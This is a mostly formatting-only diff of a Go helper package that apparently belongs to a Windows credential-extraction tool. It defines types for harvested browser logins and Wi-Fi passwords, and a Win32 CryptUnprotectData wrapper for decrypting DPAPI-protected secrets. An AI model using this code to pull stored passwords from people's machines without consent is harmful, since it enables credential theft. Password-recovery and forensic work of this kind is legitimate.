@@ -2,24 +2,22 @@ package common
 
 import (
 	"io/ioutil"
-	"unsafe"
-	"syscall"
 	"math/rand"
 	"os"
+	"syscall"
+	"unsafe"
 )
 
 var (
-
-	UserHome = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
-	AppData  = os.Getenv("APPDATA")
+	UserHome     = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
+	AppData      = os.Getenv("APPDATA")
 	LocalAppData = os.Getenv("LOCALAPPDATA")
-
 )
 
-type UrlNamePass struct{
-	Url string
+type UrlNamePass struct {
+	Url      string
 	Username string
-	Pass string
+	Pass     string
 }
 
 type NamePass struct {
@@ -27,14 +25,14 @@ type NamePass struct {
 	Pass string
 }
 
-type ExtractCredentialsResult struct{
+type ExtractCredentialsResult struct {
 	Success bool
-	Data []UrlNamePass
+	Data    []UrlNamePass
 }
 
 type ExtractWifiData struct {
 	Success bool
-	Data []NamePass
+	Data    []NamePass
 }
 
 const Fail = "fail"
@@ -49,7 +47,6 @@ func RandStringRunes(n int) string {
 	}
 	return string(b)
 }
-
 
 func RemoveDuplicates(elements []UrlNamePass) []UrlNamePass {
 	// Use map to record duplicates as we find them.
@@ -70,13 +67,13 @@ func RemoveDuplicates(elements []UrlNamePass) []UrlNamePass {
 	return result
 }
 
-func CopyFile(src string, dst string) error{
+func CopyFile(src string, dst string) error {
 	data, err := ioutil.ReadFile(src)
-	if err != nil{
+	if err != nil {
 		return err
 	}
 	err = ioutil.WriteFile(dst, data, 0644)
-	if err != nil{
+	if err != nil {
 		return err
 	}
 	return nil
@@ -84,7 +81,7 @@ func CopyFile(src string, dst string) error{
 
 /*
 	WinAPI decrypt function
- */
+*/
 type DATA_BLOB struct {
 	cbData uint32
 	pbData *byte
@@ -106,7 +103,7 @@ func (b *DATA_BLOB) ToByteArray() []byte {
 	return d
 }
 
-func Win32CryptUnprotectData(cipherText string, entropy bool) string{
+func Win32CryptUnprotectData(cipherText string, entropy bool) string {
 	var (
 		dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
 		dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
@@ -123,6 +120,7 @@ func Win32CryptUnprotectData(cipherText string, entropy bool) string{
 	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
 	return string(outblob.ToByteArray())
 }
+
 /*
 	End WinAPI decrypt function
- */
+*/
